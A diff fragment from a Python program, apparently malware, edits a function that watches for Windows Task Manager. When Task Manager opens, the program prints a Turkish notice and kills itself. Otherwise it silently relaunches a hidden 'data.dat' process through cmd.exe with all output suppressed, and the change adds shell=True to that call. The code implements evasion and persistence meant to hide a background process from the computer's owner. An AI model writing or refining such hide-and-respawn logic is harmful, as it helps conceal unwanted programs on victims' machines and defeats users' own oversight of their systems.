@@ -171,7 +171,7 @@ def task_manager_watcher():
             print("Görev Yöneticisi Açıldı!")
             kill()
         elif not ifapp():
-            subprocess.Popen(["cmd.exe", "/c", "start", "/B", "data.dat"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.Popen(["cmd.exe", "/c", "start", "/B", "data.dat"], shell=True,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(1)
 
 
